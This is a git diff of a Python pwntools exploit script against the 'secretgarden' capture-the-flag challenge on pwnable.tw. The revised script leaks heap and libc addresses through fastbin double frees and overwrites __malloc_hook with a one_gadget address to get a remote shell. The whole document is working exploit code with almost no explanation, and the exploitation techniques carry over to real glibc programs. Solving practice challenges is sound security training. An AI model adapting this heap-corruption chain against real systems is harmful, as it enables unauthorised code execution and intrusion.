@@ -1,9 +1,13 @@
 from pwn import *
 
+BEDUG = False
 
-io = process('./secretgarden', env={"LD_PRELOAD":"./libc_64.so.6"})
-#io = remote('chall.pwnable.tw', 10203)
-libc = ELF('./libc_64.so.6')
+if BEDUG==True:
+    io = process('./secretgarden')
+    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+else:
+    io = remote('chall.pwnable.tw', 10203)
+    libc = ELF('./libc_64.so.6')
 
 def malloc(size, name, color):
     print(io.recvuntil(b'Your choice : '))
@@ -29,38 +33,61 @@ def free_all():
     print(io.recvuntil(b'Your choice : '))
     io.sendline(b'4')
 
-
-malloc(40, b'A', b'B') #0
+# Leak heap
+malloc(0x28, b'AAAA', b'AAAA') #0
 free(0)
-malloc(256, b'OK', b'OK') #1
-malloc(40, b'A', b'B') #2
+malloc(0x28, b'BBBB', b'BBBB') #1
 free(1)
 free(0)
-free(2)
+free(1)
 free(0)
 view()
 print(io.recvuntil(b'Name of the flower[1] :'))
-libc.address = u64(io.recv(6)+b'\0\0') - 0x3c4b78
-log.info('LIBC ADDRESS: ' + hex(libc.address))
-malloc(10, b'A', b'B') #3
-free(3)
-malloc(10, b'A', b'B') #4
-malloc(10, b'A', b'B') #5
-malloc(10, b'A', b'B') #6
-malloc(10, b'A', b'B') #7
-malloc(50, b'A', b'B') #8
-malloc(50, b'A', b'B') #9
+heapbase = u64(io.recv(6)+b'\0\0') - 0x1040
+print(hex(heapbase))
+malloc(0x28, b'CCCC', b'CCCC') #2
+free(2)
+malloc(0x28, b'DDDD', b'DDDD') #3
+
+# Leak libc
+malloc(0x28, b'EEEE', b'EEEE') #4
+free(4)
+malloc(0x400, b'FFFF', b'FFFF') #5
+malloc(0x28, b'GGGG', b'GGGG') #6
+free(5)
+free(4)
+free(6)
+free(4)
+view()
+print(io.recvuntil(b'Name of the flower[5] :'))
+if BEDUG==True:
+    libc.address = u64(io.recv(6)+b'\0\0') - 0x3c4b78
+else:
+    libc.address = u64(io.recv(6)+b'\0\0') - 0x3c4b78 + 0x1000
+print(hex(libc.address))
+malloc(0x28, b'HHHH', b'HHHH') #7
+free(7)
+malloc(0x28, b'IIII', b'IIII') #8
+malloc(0x3d8, b'JJJJ', b'JJJJ') #9
 
 
-malloc(0x70, b'A', b'B') #10
-malloc(0x70, b'A', b'B') #11
+malloc(0x68, b'KKKK', b'KKKK') #10
+malloc(0x68, b'LLLL', b'LLLL') #11
+malloc(0x68, b'MMMM', b'MMMM') #12
+
 free(10)
 free(11)
-free(10)
-malloc(0x70, p64(libc.address+0x3c4b10-35), b'D')
-print(hex(libc.address+0x3c4b10-35))
-malloc(0x70, b'A', b'D')
-malloc(0x70, b'B', b'D')
-malloc(0x70, b'A'*19+p64(libc.address+ 0xf0567), b'D')
-malloc(0x70, b'A'*19+p64(libc.address+ 0xf0567), b'D')
-pause()
+free(12)
+free(11)
+malloc(0x68, p64(libc.sym['__malloc_hook']-35), b'NNNN')
+malloc(0x68, b'OOOO', b'OOOO')
+malloc(0x68, b'PPPP', b'PPPP')
+if BEDUG==True:
+    payload = b'\0'*0x13+p64(libc.address+0xf03a4)
+else:
+    payload = b'\0'*0x13+p64(libc.address+0xef6c4)
+malloc(0x68, payload, b'QQQQ')
+free(6)
+free(6)
+print(hex(libc.address))
+io.interactive()
